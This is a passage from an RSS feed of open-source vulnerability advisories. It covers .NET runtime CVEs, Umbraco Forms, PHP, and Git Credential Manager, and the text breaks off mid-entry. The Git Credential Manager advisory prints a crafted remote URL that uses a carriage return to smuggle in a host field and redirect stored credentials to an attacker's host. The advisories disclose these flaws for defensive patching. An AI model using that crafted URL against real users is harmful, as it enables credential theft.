### &amp;lt;a name=&quot;.NET 8&quot;&amp;gt;&amp;lt;&#x2F;a&amp;gt;.NET 8
Package name | Affected version | Patched version
------------ | ---------------- | -------------------------
[Microsoft.NetCore.App.Runtime.linux-arm](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.linux-arm)               | &amp;gt;= 8.0.0, &amp;lt; 8.0.12 | 8.0.12
[Microsoft.NetCore.App.Runtime.linux-arm64](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.linux-arm64)           | &amp;gt;= 8.0.0, &amp;lt; 8.0.12 | 8.0.12
[Microsoft.NetCore.App.Runtime.linux-musl-arm](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.linux-musl-arm)     | &amp;gt;= 8.0.0, &amp;lt; 8.0.12 | 8.0.12
[Microsoft.NetCore.App.Runtime.linux-musl-arm64](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.linux-musl-arm64) | &amp;gt;= 8.0.0, &amp;lt; 8.0.12 | 8.0.12
[Microsoft.NetCore.App.Runtime.linux-musl-x64](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.linux-musl-x64)     | &amp;gt;= 8.0.0, &amp;lt; 8.0.12 | 8.0.12
[Microsoft.NetCore.App.Runtime.linux-x64](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.linux-x64)               | &amp;gt;= 8.0.0, &amp;lt; 8.0.12 | 8.0.12
[Microsoft.NetCore.App.Runtime.osx-arm64](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.osx-arm64)               | &amp;gt;= 8.0.0, &amp;lt; 8.0.12 | 8.0.12
[Microsoft.NetCore.App.Runtime.osx-x64](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.osx-x64)                   | &amp;gt;= 8.0.0, &amp;lt; 8.0.12 | 8.0.12
[Microsoft.NetCore.App.Runtime.win-arm](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.win-arm)                   | &amp;gt;= 8.0.0, &amp;lt; 8.0.12 | 8.0.12
[Microsoft.NetCore.App.Runtime.win-arm64](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.win-arm64)               | &amp;gt;= 8.0.0, &amp;lt; 8.0.12 | 8.0.12
[Microsoft.NetCore.App.Runtime.win-x64](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.win-x64)                   | &amp;gt;= 8.0.0, &amp;lt; 8.0.12 | 8.0.12
[Microsoft.NetCore.App.Runtime.win-x86](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.win-x86)                   | &amp;gt;= 8.0.0, &amp;lt; 8.0.12 | 8.0.12

## Advisory FAQ

### &amp;lt;a name=&quot;how-affected&quot;&amp;gt;&amp;lt;&#x2F;a&amp;gt;How do I know if I am affected?

If you have a runtime or SDK with a version listed, or an affected package listed in [affected software](#affected-packages) or [affected packages](#affected-software), you&#x27;re exposed to the vulnerability.

### &amp;lt;a name=&quot;how-fix&quot;&amp;gt;&amp;lt;&#x2F;a&amp;gt;How do I fix the issue?

1. To fix the issue please install the latest version of .NET 8.0 or .NET 9.0, as appropriate. If you have installed one or more .NET SDKs through Visual Studio, Visual Studio will prompt you to update Visual Studio, which will also update your .NET  SDKs.
2. If your application references the vulnerable package, update the package reference to the patched version.

* You can list the versions you have installed by running the `dotnet --info` command. You will see output like the following;

```
.NET SDK:
 Version:           9.0.100
 Commit:            59db016f11
 Workload version:  9.0.100-manifests.3068a692
 MSBuild version:   17.12.7+5b8665660

Runtime Environment:
 OS Name:     Mac OS X
 OS Version:  15.2
 OS Platform: Darwin
 RID:         osx-arm64
 Base Path:   &#x2F;usr&#x2F;local&#x2F;share&#x2F;dotnet&#x2F;sdk&#x2F;9.0.100&#x2F;

.NET workloads installed:
There are no installed workloads to display.
Configured to use loose manifests when installing new manifests.

Host:
  Version:      9.0.0
  Architecture: arm64
  Commit:       9d5a6a9aa4

.NET SDKs installed:
  9.0.100 [&#x2F;usr&#x2F;local&#x2F;share&#x2F;dotnet&#x2F;sdk]

.NET runtimes installed:
  Microsoft.AspNetCore.App 9.0.0 [&#x2F;usr&#x2F;local&#x2F;share&#x2F;dotnet&#x2F;shared&#x2F;Microsoft.AspNetCore.App]
  Microsoft.NETCore.App 9.0.0 [&#x2F;usr&#x2F;local&#x2F;share&#x2F;dotnet&#x2F;shared&#x2F;Microsoft.NETCore.App]

Other architectures found:
  x64   [&#x2F;usr&#x2F;local&#x2F;share&#x2F;dotnet]
    registered at [&#x2F;etc&#x2F;dotnet&#x2F;install_location_x64]

Environment variables:
  Not set

global.json file:
  Not found

Learn more:
  https:&#x2F;&#x2F;aka.ms&#x2F;dotnet&#x2F;info

Download .NET:
  https:&#x2F;&#x2F;aka.ms&#x2F;dotnet&#x2F;download
```

* If you&#x27;re using .NET 9.0, you should download and install .NET 9.0  Runtime or .NET 9.0.100 SDK (for Visual Studio 2022 v17.12 latest Preview) from https:&#x2F;&#x2F;dotnet.microsoft.com&#x2F;download&#x2F;dotnet-core&#x2F;9.0.

Once you have installed the updated runtime or SDK, restart your apps for the update to take effect.

Additionally, if you&#x27;ve deployed [self-contained applications](https:&#x2F;&#x2F;docs.microsoft.com&#x2F;dotnet&#x2F;core&#x2F;deploying&#x2F;#self-contained-deployments-scd) targeting any of the impacted versions, these applications are also vulnerable and must be recompiled and redeployed.

## Other Information

### Reporting Security Issues

If you have found a potential security issue in .NET 8.0 or .NET 9.0, please email details to secure@microsoft.com. Reports may qualify for the Microsoft .NET Core &amp; .NET 5 Bounty. Details of the Microsoft .NET Bounty Program including terms and conditions are at &amp;lt;https:&#x2F;&#x2F;aka.ms&#x2F;corebounty&amp;gt;.

### Support

You can ask questions about this issue on GitHub in the .NET GitHub organization. The main repos are located at https:&#x2F;&#x2F;github.com&#x2F;dotnet&#x2F;runtime. The Announcements repo (https:&#x2F;&#x2F;github.com&#x2F;dotnet&#x2F;Announcements) will contain this bulletin as an issue and will include a link to a discussion issue. You can ask questions in the linked discussion issue.

### Disclaimer

The information provided in this advisory is provided &quot;as is&quot; without warranty of any kind. Microsoft disclaims all warranties, either express or implied, including the warranties of merchantability and fitness for a particular purpose. In no event shall Microsoft Corporation or its suppliers be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if Microsoft Corporation or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation may not apply.

### External Links

[CVE-2025-21172]( https:&#x2F;&#x2F;www.cve.org&#x2F;CVERecord?id=CVE-2025-21172)

### Revisions

V1.0 (January 14, 2024): Advisory published.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-p54p-p3qm-8vgj: 8.1 | <b>Microsoft Security Advisory CVE-2025-21171 | .NET Remote Code Execution Vulnerability</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-p54p-p3qm-8vgj</link>
                    <pubDate>2025-01-14T19:43:16Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-p54p-p3qm-8vgj'>https://osv.dev/vulnerability/GHSA-p54p-p3qm-8vgj</a><br>
                            <b>Published:</b> 2025-01-14T19:43:16Z<br>
                            <b>Severity:</b> 8.1<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/dotnet/runtime/security/advisories/GHSA-p54p-p3qm-8vgj'>https://github.com/dotnet/runtime/security/advisories/GHSA-p54p-p3qm-8vgj</a></li><li>- <a target='_blank' href='https://github.com/dotnet/runtime'>https://github.com/dotnet/runtime</a></li><li>- <a target='_blank' href='https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-21171'>https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-21171</a></li></ul><br>
                            <b>Details:</b> <b>Microsoft Security Advisory CVE-2025-21171 | .NET Remote Code Execution Vulnerability</b><br># Microsoft Security Advisory CVE-2025-21171 | .NET Remote Code Execution Vulnerability

## &amp;lt;a name=&quot;executive-summary&quot;&amp;gt;&amp;lt;&#x2F;a&amp;gt;Executive summary

Microsoft is releasing this security advisory to provide information about a vulnerability in .NET 9.0. This advisory also provides guidance on what developers can do to update their applications to remove this vulnerability.

An attacker could exploit this vulnerability by sending a specially crafted request to the vulnerable web server.

## Announcement

Announcement for this issue can be found at https:&#x2F;&#x2F;github.com&#x2F;dotnet&#x2F;runtime&#x2F;issues&#x2F;111423

## &amp;lt;a name=&quot;mitigation-factors&quot;&amp;gt;&amp;lt;&#x2F;a&amp;gt;Mitigation factors

Microsoft has not identified any mitigating factors for this vulnerability.

## &amp;lt;a name=&quot;affected-software&quot;&amp;gt;&amp;lt;&#x2F;a&amp;gt;Affected software

* Any .NET 9.0 application running on .NET 9.0.0 or earlier.

## &amp;lt;a name=&quot;affected-packages&quot;&amp;gt;&amp;lt;&#x2F;a&amp;gt;Affected Packages

The vulnerability affects any Microsoft .NET project if it uses any of affected packages versions listed below

### &amp;lt;a name=&quot;.NET 9&quot;&amp;gt;&amp;lt;&#x2F;a&amp;gt;.NET 9
Package name | Affected version | Patched version
------------ | ---------------- | -------------------------
[Microsoft.NetCore.App.Runtime.linux-arm](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.linux-arm)               | &amp;gt;= 9.0.0, &amp;lt; 9.0.1 | 9.0.1
[Microsoft.NetCore.App.Runtime.linux-arm64](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.linux-arm64)           | &amp;gt;= 9.0.0, &amp;lt; 9.0.1 | 9.0.1
[Microsoft.NetCore.App.Runtime.linux-musl-arm](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.linux-musl-arm)     | &amp;gt;= 9.0.0, &amp;lt; 9.0.1 | 9.0.1
[Microsoft.NetCore.App.Runtime.linux-musl-arm64](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.linux-musl-arm64) | &amp;gt;= 9.0.0, &amp;lt; 9.0.1 | 9.0.1
[Microsoft.NetCore.App.Runtime.linux-musl-x64](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.linux-musl-x64)     | &amp;gt;= 9.0.0, &amp;lt; 9.0.1 | 9.0.1
[Microsoft.NetCore.App.Runtime.linux-x64](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.linux-x64)               | &amp;gt;= 9.0.0, &amp;lt; 9.0.1 | 9.0.1
[Microsoft.NetCore.App.Runtime.osx-arm64](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.osx-arm64)               | &amp;gt;= 9.0.0, &amp;lt; 9.0.1 | 9.0.1
[Microsoft.NetCore.App.Runtime.osx-x64](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.osx-x64)                   | &amp;gt;= 9.0.0, &amp;lt; 9.0.1 | 9.0.1
[Microsoft.NetCore.App.Runtime.win-arm](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.win-arm)                   | &amp;gt;= 9.0.0, &amp;lt; 9.0.1 | 9.0.1
[Microsoft.NetCore.App.Runtime.win-arm64](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.win-arm64)               | &amp;gt;= 9.0.0, &amp;lt; 9.0.1 | 9.0.1
[Microsoft.NetCore.App.Runtime.win-x64](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.win-x64)                   | &amp;gt;= 9.0.0, &amp;lt; 9.0.1 | 9.0.1
[Microsoft.NetCore.App.Runtime.win-x86](https:&#x2F;&#x2F;www.nuget.org&#x2F;packages&#x2F;Microsoft.NetCore.App.Runtime.win-x86)                   | &amp;gt;= 9.0.0, &amp;lt; 9.0.1 | 9.0.1

## Advisory FAQ

### &amp;lt;a name=&quot;how-affected&quot;&amp;gt;&amp;lt;&#x2F;a&amp;gt;How do I know if I am affected?

If you have a runtime or SDK with a version listed, or an affected package listed in [affected software](#affected-packages) or [affected packages](#affected-software), you&#x27;re exposed to the vulnerability.

### &amp;lt;a name=&quot;how-fix&quot;&amp;gt;&amp;lt;&#x2F;a&amp;gt;How do I fix the issue?

1. To fix the issue please install the latest version of .NET 9.0. If you have installed one or more .NET SDKs through Visual Studio, Visual Studio will prompt you to update Visual Studio, which will also update your .NET  SDKs.
2. If your application references the vulnerable package, update the package reference to the patched version.

* You can list the versions you have installed by running the `dotnet --info` command. You will see output like the following;

```
.NET SDK:
 Version:           9.0.100
 Commit:            59db016f11
 Workload version:  9.0.100-manifests.3068a692
 MSBuild version:   17.12.7+5b8665660

Runtime Environment:
 OS Name:     Mac OS X
 OS Version:  15.2
 OS Platform: Darwin
 RID:         osx-arm64
 Base Path:   &#x2F;usr&#x2F;local&#x2F;share&#x2F;dotnet&#x2F;sdk&#x2F;9.0.100&#x2F;

.NET workloads installed:
There are no installed workloads to display.
Configured to use loose manifests when installing new manifests.

Host:
  Version:      9.0.0
  Architecture: arm64
  Commit:       9d5a6a9aa4

.NET SDKs installed:
  9.0.100 [&#x2F;usr&#x2F;local&#x2F;share&#x2F;dotnet&#x2F;sdk]

.NET runtimes installed:
  Microsoft.AspNetCore.App 9.0.0 [&#x2F;usr&#x2F;local&#x2F;share&#x2F;dotnet&#x2F;shared&#x2F;Microsoft.AspNetCore.App]
  Microsoft.NETCore.App 9.0.0 [&#x2F;usr&#x2F;local&#x2F;share&#x2F;dotnet&#x2F;shared&#x2F;Microsoft.NETCore.App]

Other architectures found:
  x64   [&#x2F;usr&#x2F;local&#x2F;share&#x2F;dotnet]
    registered at [&#x2F;etc&#x2F;dotnet&#x2F;install_location_x64]

Environment variables:
  Not set

global.json file:
  Not found

Learn more:
  https:&#x2F;&#x2F;aka.ms&#x2F;dotnet&#x2F;info

Download .NET:
  https:&#x2F;&#x2F;aka.ms&#x2F;dotnet&#x2F;download
```

* If you&#x27;re using .NET 9.0, you should download and install .NET 9.0  Runtime or .NET 9.0.100 SDK (for Visual Studio 2022 v17.12 latest Preview) from https:&#x2F;&#x2F;dotnet.microsoft.com&#x2F;download&#x2F;dotnet-core&#x2F;9.0.

Once you have installed the updated runtime or SDK, restart your apps for the update to take effect.

Additionally, if you&#x27;ve deployed [self-contained applications](https:&#x2F;&#x2F;docs.microsoft.com&#x2F;dotnet&#x2F;core&#x2F;deploying&#x2F;#self-contained-deployments-scd) targeting any of the impacted versions, these applications are also vulnerable and must be recompiled and redeployed.

## Other Information

### Reporting Security Issues

If you have found a potential security issue in .NET 9.0 please email details to secure@microsoft.com. Reports may qualify for the Microsoft .NET Core &amp; .NET 5 Bounty. Details of the Microsoft .NET Bounty Program including terms and conditions are at &amp;lt;https:&#x2F;&#x2F;aka.ms&#x2F;corebounty&amp;gt;.

### Support

You can ask questions about this issue on GitHub in the .NET GitHub organization. The main repos are located at https:&#x2F;&#x2F;github.com&#x2F;dotnet&#x2F;runtime. The Announcements repo (https:&#x2F;&#x2F;github.com&#x2F;dotnet&#x2F;Announcements) will contain this bulletin as an issue and will include a link to a discussion issue. You can ask questions in the linked discussion issue.

### Disclaimer

The information provided in this advisory is provided &quot;as is&quot; without warranty of any kind. Microsoft disclaims all warranties, either express or implied, including the warranties of merchantability and fitness for a particular purpose. In no event shall Microsoft Corporation or its suppliers be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if Microsoft Corporation or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation may not apply.

### External Links

[CVE-2025-21171]( https:&#x2F;&#x2F;www.cve.org&#x2F;CVERecord?id=CVE-2025-21171)

### Revisions

V1.0 (January 14, 2024): Advisory published.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-9v8m-qv22-f268: 5.8 | <b>Umbraco Forms&#x27;s Short and Long Answer Fields Are Not Validated Server-Side For Maximum Length</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-9v8m-qv22-f268</link>
                    <pubDate>2025-01-14T19:41:48Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-9v8m-qv22-f268'>https://osv.dev/vulnerability/GHSA-9v8m-qv22-f268</a><br>
                            <b>Published:</b> 2025-01-14T19:41:48Z<br>
                            <b>Severity:</b> 5.8<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/umbraco/Umbraco.Forms.Issues/security/advisories/GHSA-9v8m-qv22-f268'>https://github.com/umbraco/Umbraco.Forms.Issues/security/advisories/GHSA-9v8m-qv22-f268</a></li></ul><br>
                            <b>Details:</b> <b>Umbraco Forms&#x27;s Short and Long Answer Fields Are Not Validated Server-Side For Maximum Length</b><br>### Impact

Character limits configured by editors for short and long answer fields are validated only client-side, not server-side.

### Patches

Patched in 8.13.16, 10.5.7, 13.2.2, 14.1.2


                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-86c2-4x57-wc8g: 7.4 | <b>Git Credential Manager carriage-return character in remote URL allows malicious repository to leak credentials</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-86c2-4x57-wc8g</link>
                    <pubDate>2025-01-14T19:40:54Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-86c2-4x57-wc8g'>https://osv.dev/vulnerability/GHSA-86c2-4x57-wc8g</a><br>
                            <b>Published:</b> 2025-01-14T19:40:54Z<br>
                            <b>Severity:</b> 7.4<br>
                            <b>Langs:</b> cs
c<br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/git-ecosystem/git-credential-manager/security/advisories/GHSA-86c2-4x57-wc8g'>https://github.com/git-ecosystem/git-credential-manager/security/advisories/GHSA-86c2-4x57-wc8g</a></li><li>- <a target='_blank' href='https://git-scm.com/docs/git-credential#IOFMT'>https://git-scm.com/docs/git-credential#IOFMT</a></li><li>- <a target='_blank' href='https://github.com/dotnet/runtime/blob/e476b43b5cb42eb44ce23b1c7b793aa361624cf6/src/libraries/System.Private.CoreLib/src/System/IO/StreamReader.cs#L926'>https://github.com/dotnet/runtime/blob/e476b43b5cb42eb44ce23b1c7b793aa361624cf6/src/libraries/System.Private.CoreLib/src/System/IO/StreamReader.cs#L926</a></li><li>- <a target='_blank' href='https://github.com/git-ecosystem/git-credential-manager'>https://github.com/git-ecosystem/git-credential-manager</a></li><li>- <a target='_blank' href='https://github.com/git-ecosystem/git-credential-manager/blob/ae009e11a0fbef804ad9f78816d84a0bc7e052fe/src/shared/Core/StreamExtensions.cs#L138-L141'>https://github.com/git-ecosystem/git-credential-manager/blob/ae009e11a0fbef804ad9f78816d84a0bc7e052fe/src/shared/Core/StreamExtensions.cs#L138-L141</a></li><li>- <a target='_blank' href='https://github.com/git-ecosystem/git-credential-manager/compare/749e287571c78a2b61f926ccce6a707050871ab8...99e2f7f60e7364fe807e7925f361a81f3c47bd1b'>https://github.com/git-ecosystem/git-credential-manager/compare/749e287571c78a2b61f926ccce6a707050871ab8...99e2f7f60e7364fe807e7925f361a81f3c47bd1b</a></li><li>- <a target='_blank' href='https://github.com/git-ecosystem/git-credential-manager/releases/tag/v2.6.1'>https://github.com/git-ecosystem/git-credential-manager/releases/tag/v2.6.1</a></li><li>- <a target='_blank' href='https://github.com/git/git/blob/6a11438f43469f3815f2f0fc997bd45792ff04c0/credential.c#L311'>https://github.com/git/git/blob/6a11438f43469f3815f2f0fc997bd45792ff04c0/credential.c#L311</a></li><li>- <a target='_blank' href='https://learn.microsoft.com/en-us/dotnet/api/system.io.streamreader?view=net-8.0'>https://learn.microsoft.com/en-us/dotnet/api/system.io.streamreader?view=net-8.0</a></li></ul><br>
                            <b>Details:</b> <b>Git Credential Manager carriage-return character in remote URL allows malicious repository to leak credentials</b><br>### Description
The [Git credential protocol](https:&#x2F;&#x2F;git-scm.com&#x2F;docs&#x2F;git-credential#IOFMT) is text-based over standard input&#x2F;output, and consists of a series of lines of key-value pairs in the format `key=value`. Git&#x27;s documentation restricts the use of the NUL (`\0`) character and newlines to form part of the keys[^1] or values.

When Git reads from standard input, it considers both LF and CRLF[^2] as newline characters for the credential protocol by virtue of [calling `strbuf_getline`](https:&#x2F;&#x2F;github.com&#x2F;git&#x2F;git&#x2F;blob&#x2F;6a11438f43469f3815f2f0fc997bd45792ff04c0&#x2F;credential.c#L311) that calls to `strbuf_getdelim_strip_crlf`. Git also validates that a newline is not present in the value by checking for the presence of the line-feed character (LF, `\n`), and errors if this is the case. This captures both LF and CRLF-type newlines.

Git Credential Manager uses the .NET standard library [`StreamReader`](https:&#x2F;&#x2F;learn.microsoft.com&#x2F;en-us&#x2F;dotnet&#x2F;api&#x2F;system.io.streamreader?view=net-8.0) class to [read the standard input stream line-by-line](https:&#x2F;&#x2F;github.com&#x2F;git-ecosystem&#x2F;git-credential-manager&#x2F;blob&#x2F;ae009e11a0fbef804ad9f78816d84a0bc7e052fe&#x2F;src&#x2F;shared&#x2F;Core&#x2F;StreamExtensions.cs#L138-L141) and parse the `key=value` credential protocol format. The [implementation of the `ReadLineAsync` method](https:&#x2F;&#x2F;github.com&#x2F;dotnet&#x2F;runtime&#x2F;blob&#x2F;e476b43b5cb42eb44ce23b1c7b793aa361624cf6&#x2F;src&#x2F;libraries&#x2F;System.Private.CoreLib&#x2F;src&#x2F;System&#x2F;IO&#x2F;StreamReader.cs#L926) considers LF, CRLF, and CR as valid line endings. This is means that .NET considers a single CR as a valid newline character, whereas Git does not.

This mismatch of newline treatment between Git and GCM means that an attacker can craft a malicious remote URL such as:

```
https:&#x2F;&#x2F;\rhost=targethost@badhost
```

..which will be interpreted by Git as:

```
protocol=https
host=badhost
username=\rhost=targethost
```

This will instead be parsed by GCM as if the following has been passed by Git:

```
protocol=https
host=badhost
username=
host=targethost
```

This results in the `host` field being resolved to the `targethost` value. GCM will then return a credential for `targethost` to Git, which will then send this credential to the `badhost` host.

### Impact
When a user clones or otherwise interacts[^3] with a malicious repository that requires authentication, the attacker can capture credentials for another Git remote. The attack is also heightened when cloning from repositories with submodules when using the `--recursive` clone option as the user is not able to inspect the submodule remote URLs beforehand.

### Patches
https:&#x2F;&#x2F;github.com&#x2F;git-ecosystem&#x2F;git-credential-manager&#x2F;compare&#x2F;749e287571c78a2b61f926ccce6a707050871ab8...99e2f7f60e7364fe807e7925f361a81f3c47bd1b

### Workarounds
Only interacting with trusted remote repositories, and do not clone with `--recursive` to allow inspection of any submodule URLs before cloning those submodules.

### Fixed versions
This issue is fixed as of [version 2.6.1](https:&#x2F;&#x2F;github.com&#x2F;git-ecosystem&#x2F;git-credential-manager&#x2F;releases&#x2F;tag&#x2F;v2.6.1).

[^1]: The `=` character is also forbidden to form part of the key.
[^2]: Carriage-return character (CR, `\r`), followed by a line-feed character.
[^3]: Any remote operation such as `fetch`, `ls-remote`, etc.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-php-min-2020-7070: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-php-min-2020-7070</link>
                    <pubDate>2025-01-14T19:23:10.221Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-php-min-2020-7070'>https://osv.dev/vulnerability/BIT-php-min-2020-7070</a><br>
                            <b>Published:</b> 2025-01-14T19:23:10.221Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='http://cve.circl.lu/cve/CVE-2020-8184'>http://cve.circl.lu/cve/CVE-2020-8184</a></li><li>- <a target='_blank' href='http://lists.opensuse.org/opensuse-security-announce/2020-10/msg00045.html'>http://lists.opensuse.org/opensuse-security-announce/2020-10/msg00045.html</a></li><li>- <a target='_blank' href='http://lists.opensuse.org/opensuse-security-announce/2020-10/msg00067.html'>http://lists.opensuse.org/opensuse-security-announce/2020-10/msg00067.html</a></li><li>- <a target='_blank' href='https://bugs.php.net/bug.php?id=79699'>https://bugs.php.net/bug.php?id=79699</a></li><li>- <a target='_blank' href='https://hackerone.com/reports/895727'>https://hackerone.com/reports/895727</a></li><li>- <a target='_blank' href='https://lists.debian.org/debian-lts-announce/2020/10/msg00008.html'>https://lists.debian.org/debian-lts-announce/2020/10/msg00008.html</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/7EVDN7D3IB4EAI4D3ZOM2OJKQ5SD7K4E/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/7EVDN7D3IB4EAI4D3ZOM2OJKQ5SD7K4E/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/P2J3ZZDHCSX65T5QWV4AHBN7MOJXBEKG/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/P2J3ZZDHCSX65T5QWV4AHBN7MOJXBEKG/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/RRU57N3OSYZPOMFWPRDNVH7EMYOTSZ66/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/RRU57N3OSYZPOMFWPRDNVH7EMYOTSZ66/</a></li><li>- <a target='_blank' href='https://security.gentoo.org/glsa/202012-16'>https://security.gentoo.org/glsa/202012-16</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20201016-0001/'>https://security.netapp.com/advisory/ntap-20201016-0001/</a></li><li>- <a target='_blank' href='https://usn.ubuntu.com/4583-1/'>https://usn.ubuntu.com/4583-1/</a></li><li>- <a target='_blank' href='https://www.debian.org/security/2021/dsa-4856'>https://www.debian.org/security/2021/dsa-4856</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpuoct2021.html'>https://www.oracle.com/security-alerts/cpuoct2021.html</a></li><li>- <a target='_blank' href='https://www.tenable.com/security/tns-2021-14'>https://www.tenable.com/security/tns-2021-14</a></li></ul><br>
                            <b>Details:</b> <b></b><br>In PHP versions 7.2.x below 7.2.34, 7.3.x below 7.3.23 and 7.4.x below 7.4.11, when PHP is processing incoming HTTP cookie values, the cookie names are url-decoded. This may lead to cookies with prefixes like __Host confused with cookies that decode to such prefix, thus leading to an attacker being able to forge cookie which is supposed to be secure. See also CVE-2020-8184 for more information.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-php-min-2022-37454: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-php-min-2022-37454</link>
                    <pubDate>2025-01-14T19:21:21.696Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-php-min-2022-37454'>https://osv.dev/vulnerability/BIT-php-min-2022-37454</a><br>
                            <b>Published:</b> 2025-01-14T19:21:21.696Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://csrc.nist.gov/projects/hash-functions/sha-3-project'>https://csrc.nist.gov/projects/hash-functions/sha-3-project</a></li><li>- <a target='_blank' href='https://eprint.iacr.org/2023/331'>https://eprint.iacr.org/2023/331</a></li><li>- <a target='_blank' href='https://github.com/XKCP/XKCP/security/advisories/GHSA-6w4m-2xhg-2658'>https://github.com/XKCP/XKCP/security/advisories/GHSA-6w4m-2xhg-2658</a></li><li>- <a target='_blank' href='https://lists.debian.org/debian-lts-announce/2022/10/msg00041.html'>https://lists.debian.org/debian-lts-announce/2022/10/msg00041.html</a></li><li>- <a target='_blank' href='https://lists.debian.org/debian-lts-announce/2022/11/msg00000.html'>https://lists.debian.org/debian-lts-announce/2022/11/msg00000.html</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/3ALQ6BDDPX5HU5YBQOBMDVAA2TSGDKIJ/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/3ALQ6BDDPX5HU5YBQOBMDVAA2TSGDKIJ/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/CMIEXLMTW5GO36HTFFWIPB3OHZXCT3G4/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/CMIEXLMTW5GO36HTFFWIPB3OHZXCT3G4/</a></li><li>- <a target='_blank' href='https://mouha.be/sha-3-buffer-overflow/'>https://mouha.be/sha-3-buffer-overflow/</a></li><li>- <a target='_blank' href='https://news.ycombinator.com/item?id=33281106'>https://news.ycombinator.com/item?id=33281106</a></li><li>- <a target='_blank' href='https://news.ycombinator.com/item?id=35050307'>https://news.ycombinator.com/item?id=35050307</a></li><li>- <a target='_blank' href='https://security.gentoo.org/glsa/202305-02'>https://security.gentoo.org/glsa/202305-02</a></li><li>- <a target='_blank' 